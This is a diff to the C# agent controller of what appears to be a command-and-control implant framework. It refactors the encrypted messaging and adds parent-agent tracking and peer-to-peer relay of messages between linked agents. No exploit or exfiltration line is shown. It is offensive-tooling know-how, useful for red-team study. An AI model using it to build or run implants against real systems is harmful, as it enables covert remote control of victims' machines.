@@ -3,7 +3,6 @@ using Agent.Models;
 using Agent.Utilities;
 
 using Shared.Models;
-using Shared.Utilities;
 
 using System;
 using System.Collections.Generic;
@@ -17,8 +16,10 @@ namespace Agent.Controllers
         ModuleStatus Status;
 
         public string AgentID;
+        public string ParentAgentID;
 
-        byte[] SessionKey;
+        public CryptoController Crypto;
+
         ICommModule CommModule;
         ConfigController Config;
         PeerToPeerController P2PController;
@@ -27,13 +28,12 @@ namespace Agent.Controllers
 
         public delegate void AgentCommand(string AgentID, C2Data C2Data);
 
-        public AgentController(string AgentID, byte[] SessionKey, ICommModule CommModule, ConfigController Config)
+        public AgentController(ICommModule CommModule, CryptoController Crypto, ConfigController Config)
         {
             Status = ModuleStatus.Starting;
 
-            this.AgentID = AgentID;
-            this.SessionKey = SessionKey;
             this.CommModule = CommModule;
+            this.Crypto = Crypto;
             this.Config = Config;
 
             P2PController = new PeerToPeerController(this);
@@ -56,38 +56,55 @@ namespace Agent.Controllers
             {
                 if (CommModule.RecvData(out AgentMessage Message))
                 {
-                    HandleC2Data(Message);
+                    HandleAgentMessage(Message);
                 }
             }
         }
 
-        void HandleC2Data(AgentMessage Message)
+        public void HandleAgentMessage(AgentMessage Message)
         {
-            var c2Data = Shared.Utilities.Utilities.DecryptData<C2Data>(Message.Data, SessionKey, Message.IV);
+            C2Data c2Data = null;
+            AgentMessage message = null;
 
-            AgentCommand callback = null;
-
-            var module = AgentModules.FirstOrDefault(m => m.Name.Equals(c2Data.Module, StringComparison.OrdinalIgnoreCase));
-
-            if (module == null)
+            try
             {
-                SendMessage("Requested module not found");
+                c2Data = Crypto.Decrypt<C2Data>(Message.Data, Message.IV);
             }
-            else
+            catch
             {
-                var command = module.Commands.FirstOrDefault(c => c.Name.Equals(c2Data.Command, StringComparison.OrdinalIgnoreCase));
+                message = Crypto.Decrypt<AgentMessage>(Message.Data, Message.IV);
+            }
 
-                if (command == null)
+            if (c2Data != null)
+            {
+                AgentCommand callback = null;
+
+                var module = AgentModules.FirstOrDefault(m => m.Name.Equals(c2Data.Module, StringComparison.OrdinalIgnoreCase));
+
+                if (module == null)
                 {
-                    SendMessage($"Request command not found in module {module}");
+                    SendMessage("Requested module not found");
                 }
                 else
                 {
-                    callback = command.Delegate;
-                }
-            }
+                    var command = module.Commands.FirstOrDefault(c => c.Name.Equals(c2Data.Command, StringComparison.OrdinalIgnoreCase));
 
-            callback?.Invoke(Message.AgentID, c2Data);
+                    if (command == null)
+                    {
+                        SendMessage($"Request command not found in module {module}");
+                    }
+                    else
+                    {
+                        callback = command.Delegate;
+                    }
+                }
+
+                callback?.Invoke(Message.AgentID, c2Data);
+            }
+            else if(message != null)
+            {
+                SendMessage(message);
+            }
         }
 
         void SendInitialMetadata()
@@ -116,7 +133,7 @@ namespace Agent.Controllers
 
         public void SendMessage(C2Data C2Data)
         {
-            var data = Shared.Utilities.Utilities.EncryptData(C2Data, SessionKey, out byte[] iv);
+            var data = Crypto.Encrypt(C2Data, out byte[] iv);
 
             CommModule.SendData(new AgentMessage
             {
@@ -126,74 +143,79 @@ namespace Agent.Controllers
             });
         }
 
+        public void SendMessage(AgentMessage Message)
+        {
+            CommModule.SendData(Message);
+        }
+
         public void SendMessage(string Module, string Command, string Data)
         {
-            var data = Shared.Utilities.Utilities.EncryptData(new C2Data
+            var c2Data = Crypto.Encrypt(new C2Data
             {
                 Module = Module,
                 Command = Command,
                 Data = Encoding.UTF8.GetBytes(Data)
             },
-            SessionKey, out byte[] iv);
+            out byte[] iv);
 
             CommModule.SendData(new AgentMessage
             {
                 AgentID = AgentID,
-                Data = data,
+                Data = c2Data,
                 IV = iv
             });
         }
 
         public void SendMessage(string Module, string Command, byte[] Data)
         {
-            var data = Shared.Utilities.Utilities.EncryptData(new C2Data
+            var c2Data = Crypto.Encrypt(new C2Data
             {
                 Module = Module,
                 Command = Command,
                 Data = Data
             },
-            SessionKey, out byte[] iv);
+            out byte[] iv);
 
             CommModule.SendData(new AgentMessage
             {
                 AgentID = AgentID,
-                Data = data,
+                Data = c2Data,
                 IV = iv
             });
         }
 
         public void SendMessage(string Data)
         {
-            var data = Shared.Utilities.Utilities.EncryptData(new C2Data
+            var c2Data = Crypto.Encrypt(new C2Data
             {
                 Module = "Core",
                 Command = "AgentOutput",
                 Data = Encoding.UTF8.GetBytes(Data)
             },
-            SessionKey, out byte[] iv);
+            out byte[] iv);
 
             CommModule.SendData(new AgentMessage
             {
                 AgentID = AgentID,
-                Data = data,
+                Data = c2Data,
                 IV = iv
             });
         }
 
         public void SendError(string Error)
         {
-            var data = Shared.Utilities.Utilities.EncryptData(new C2Data
+            var c2Data = Crypto.Encrypt(new C2Data
             {
                 Module = "Core",
                 Command = "AgentError",
                 Data = Encoding.UTF8.GetBytes(Error)
             },
-            SessionKey, out byte[] iv);
+            out byte[] iv);
 
             CommModule.SendData(new AgentMessage
             {
                 AgentID = AgentID,
-                Data = data,
+                Data = c2Data,
                 IV = iv
             });
         }
@@ -201,6 +223,11 @@ namespace Agent.Controllers
         public void AddP2PAgent(ICommModule CommModule)
         {
             P2PController.LinkAgent(CommModule);
+        }
+
+        public void UpdateP2PPlaceholder(string Placeholder, string AgentID)
+        {
+            P2PController.UpdatePlaceholder(Placeholder, AgentID);
         }
 
         public void Stop()
